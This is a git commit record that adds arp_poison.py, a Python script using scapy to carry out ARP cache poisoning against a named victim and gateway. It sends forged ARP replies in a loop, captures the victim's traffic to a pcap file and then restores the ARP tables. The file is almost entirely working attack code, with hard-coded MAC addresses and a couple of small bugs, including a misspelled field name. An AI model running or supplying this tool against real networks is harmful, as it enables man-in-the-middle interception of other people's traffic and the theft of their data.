d466f475be064f9ce4d29ef95f2d59441c63ec1e
bas <bas_neyt@hotmail.com>
2023-01-17 07:17:20 -0500

    temp

---
+++ arp_poison.py
@@ -0,0 +1,103 @@
+from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)
+from multiprocessing import Process
+
+import os
+import sys
+import time
+
+# Returns the mac address of the target_ip
+def get_mac_addr(target_ip):
+    # We build a packet that is going to be broadcasted to all nodes
+    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=target_ip)
+    response, _ =srp(packet, timeout=2, retry=10, verbose=False)
+    # print(response)
+    for _, r in response:
+        return r[Ether].src
+    return None
+
+class Arper:
+    def __init__(self, victim, gateway, interface='en0'):
+        self.victim = victim
+        #self.victim_mac = get_mac_addr(victim)
+        self.victim_mac = 'b0:be:83:4e:e2:36'
+        self.gateway = gateway
+        #self.gateway_mac = get_mac_addr(gateway)
+        self.gateway_mac = '6c:ba:b8:ce:b6:93' 
+        self.interface = interface
+        conf.iface = interface
+        conf.verb = 0
+        print(f'Initialized {interface}')
+        print(f'Gateway ({gateway}) is at {self.gateway_mac}.')
+        print(f'Victim ({victim}) is at {self.victim_mac}')
+        print('-'*30)
+    
+    def run(self):
+        # We create 2 processes and run them. First one will poison the ARP cache and the second
+        # one will watch the attack by sniffing network traffic
+        self.poison_thread = Process(target=self.poison)
+        self.poison_thread.start()
+
+        self.sniff_thread = Process(target=self.sniff)
+        self.sniff_thread.start()
+
+
+    def poison(self):
+        poison_victim = ARP()
+        poison_victim.op = 2
+        poison_victim.pscr = self.gateway
+        poison_victim.pdst = self.victim
+        poison_victim.hwdst = self.victim_mac
+        print(f'ip src: {poison_victim.psrc}')
+        print(f'ip dst: {poison_victim.pdst}')
+        print(f'mac dst: {poison_victim.hwdst}')
+        print(f'mac src: {poison_victim.hwsrc}')
+        print(poison_victim.summary())
+        print('-'*30)
+
+        poison_gateway = ARP()
+        poison_gateway.op = 2
+        poison_gateway.psrc = self.victim
+        poison_gateway.pdst = self.gateway
+        poison_gateway.hwdst = self.gateway_mac
+        print(f'ip src: {poison_gateway.psrc}')
+        print(f'ip dst: {poison_gateway.pdst}')
+        print(f'mac dst: {poison_gateway.hwdst}')
+        print(f'mac src: {poison_gateway.hwsrc}')
+        print(poison_gateway.summary())
+        print('-'*30)
+        print(f'Beginning the ARP poison. [CTRL-C to stop]')
+        while True:
+            sys.stdout.write('.')
+            sys.stdout.flush()
+            try:
+                send(poison_victim)
+                send(poison_gateway)
+            except KeyboardInterrupt:
+                self.restore()
+                sys.exit()
+            else:
+                time.sleep(2)
+
+    def sniff(self, count=50):
+        time.sleep(5)
+        print(f'Sniffing {count} packets')
+        bpf_filter = "ip host %s" %victim
+        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
+        wrpcap('arper.pcap', packets)
+        print('[OK] Got the packets!')
+        self.restore()
+        self.poison_thread.terminate()
+        print('Finished')
+
+
+
+    def restore(self):
+        print('Restoring ARP tables...')
+        send(ARP(op=2, psrc=self.gateway, hwsrc=self.gateway_mac, pdst=self.victim, hwdst='ff:ff:ff:ff:ff:ff'), count=5)
+        send(ARP(op=2, psrc=self.victim, hwsrc=self.victim_mac, pdst=self.gateway, hwdst='ff:ff:ff:ff:ff:ff'), count=5)
+
+if __name__=='__main__':
+    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
+    myarp = Arper(victim, gateway, interface)
+    myarp.run()
+   #get_mac_addr('10.0.2.15')
